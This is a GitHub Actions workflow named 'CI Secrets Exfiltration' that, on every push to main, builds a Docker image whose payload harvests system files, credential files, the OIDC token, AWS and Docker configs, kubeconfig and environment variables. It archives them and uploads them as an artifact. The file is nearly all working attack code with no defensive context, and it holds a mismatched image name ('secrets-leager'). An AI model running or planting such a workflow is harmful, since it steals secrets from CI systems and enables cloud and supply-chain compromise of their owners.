name: CI Secrets Exfiltration

on:
  push:
    branches: [ main ]

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # For OIDC token access
      contents: read    # Avoid GITHUB_TOKEN usage

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build and Run Malicious Image
        run: |
          PAYLOAD=$(cat <<'EOF'
          # 1. Copy critical system/config files
          cp -r /etc /loot/etc 2>/dev/null || true
          cp -r /root /loot/root 2>/dev/null || true
          cp -r /var/run/secrets /loot/var_run_secrets 2>/dev/null || true
          cp -r /home/runner /loot/runner_home 2>/dev/null || true

          # 2. Steal credentials & tokens
          find / \( -name "*.env" -o -name ".npmrc" -o -name ".git-credentials" \) \
            -exec cp --parents {} /loot/ 2>/dev/null \; || true
          cp /token /loot/oidc_token 2>/dev/null || true

          # 3. Dump environment, processes, and network
          env > /loot/full_env.txt
          ps aux > /loot/running_processes.txt
          netstat -tuln > /loot/open_ports.txt
          docker ps -a > /loot/docker_containers.txt

          # 4. Extract cloud/container secrets
          (test -f /var/lib/kubelet/kubeconfig && cp /var/lib/kubelet/kubeconfig /loot/kubeconfig) || true
          (test -d ~/.aws && cp -r ~/.aws /loot/aws_creds) || true
          (test -d ~/.docker && cp -r ~/.docker /loot/docker_config) || true

          # 5. Archive everything
          tar -czf /leaks.tgz -C /loot .
          EOF
          )

          # Build and run the malicious image
          docker build --build-arg PAYLOAD="$PAYLOAD" -t secrets-leaker .
          docker run --rm -v $PWD:/out secrets-leager sh -c "cp /leaks.tgz /out/leaks.tgz || true"

      - name: Upload Leaked Data
        uses: actions/upload-artifact@v4
        with:
          name: nuclear-ci-leaks
          path: leaks.tgz
